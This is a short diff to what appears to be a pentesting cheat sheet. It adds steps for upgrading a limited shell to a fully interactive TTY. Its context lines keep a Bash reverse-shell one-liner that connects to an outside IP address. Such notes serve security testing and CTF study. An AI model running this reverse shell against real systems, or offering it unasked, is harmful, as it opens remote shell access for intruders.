@@ -11,6 +11,14 @@ https://www.metahackers.pro/upgrade-shell-to-fully-interactive-tty-shell/
  ## Upbrade from limited shell
 https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
 
+## Upgrad a no interactive shell
+	SHELL=/bin/bash script -q /dev/null
+	Ctrl-Z
+	stty raw -echo
+	fg
+	reset
+	xterm
+
 # Bash
 - bash -i >& /dev/tcp/10.93.3.19/8080 0>&1
 
